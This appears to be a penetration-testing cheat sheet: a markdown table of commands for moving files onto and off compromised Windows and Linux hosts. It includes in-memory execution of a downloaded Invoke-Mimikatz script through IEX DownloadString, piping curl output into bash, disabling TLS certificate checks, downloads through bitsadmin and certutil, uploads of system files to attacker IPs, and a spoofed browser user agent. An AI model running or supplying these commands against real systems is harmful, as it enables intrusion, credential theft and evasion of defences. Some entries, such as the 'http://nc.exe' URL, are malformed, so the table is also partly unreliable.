| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing` | Bypass error in powershell |
| `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` | Bypass error for SSL/TLS not trusted in powershell |
| `Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts` | Using python uploadserver (like simplehttpserver) to upload a file from powershell |
| `Invoke-WebRequest -Uri http://<ip>:<port> -Method POST -Body $b64` | Upload a file with PowerShell using nc -lnvp |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget (adding `wget -q0-` to do fileless download) |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL (adding `| bash` in the end to do fileless download) |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |


| `Invoke-WebRequest -Uri “http://10.10.14.237:9999/file” -OutFile “C:\path"` | Download a file with PowerShell |
| `scp -P 9888 C:\tools\<filename> kali@10.10.15.23:/home/kali/Documents` | Upload a file with Powershell |